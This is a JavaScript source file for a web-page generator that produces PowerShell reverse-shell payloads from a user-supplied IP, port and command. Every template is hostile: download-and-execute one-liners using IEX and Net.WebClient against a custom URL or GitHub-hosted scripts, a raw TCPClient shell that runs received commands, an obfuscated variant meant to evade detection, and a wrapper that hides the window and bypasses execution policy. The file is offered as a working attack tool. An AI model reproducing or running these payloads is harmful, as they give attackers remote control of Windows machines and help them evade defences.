let results = document.getElementById("results");

const wrap = text => `powershell -nop -noni -W hidden -Exec Bypass -c "${text}"`;
const debugwrap = text => `powershell "${text}"`;


const custom = (url) => `IEX (New-Object Net.WebClient).DownloadString('${url}')`;
const powercat = (ip, port, command) => `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/discapes/reverse-powershell/master/epiclion.ps1'); epiclion -c ${ip} -p ${port} -e ${command}`;
const powercat2 = (ip, port, command) => `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/discapes/reverse-powershell/master/pwrct.ps1'); Main @('${ip}',$False,${port},60) @('${command}')`;
const minimal = (ip, port) => `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
const minimalObf = (ip, port) => `Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('${ip}',${port}));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
// https://github.com/danielbohannon/Invoke-Obfuscation AssignmentStatementAst

function generate() {
    let wrapperType = document.querySelector('input[name="wrapper"]:checked').value;
    let scriptType = document.querySelector('input[name="script"]:checked').value;
    let ip = document.getElementById("ip").value;
    let port = document.getElementById("port").value;
    let command = document.getElementById("command").value;
    let url = document.getElementById("url").value;

    let script;

    switch (scriptType) {
        case "custom":
            script = custom(url);
            break;
        case "powercat":
            script = powercat(ip, port, command);
            break;
        case "powercat2":
            script = powercat2(ip, port, command);
            break;
        case "minimal":
            script = minimalObf(ip, port);
            break;
    }
    switch (wrapperType) {
        case "nowrapper":
            results.innerText = script;
            break;
        case "wrapper":
            results.innerText = wrap(script);
            break;
        case "debugwrapper":
            results.innerText = debugwrap(script);
            break;
    }
}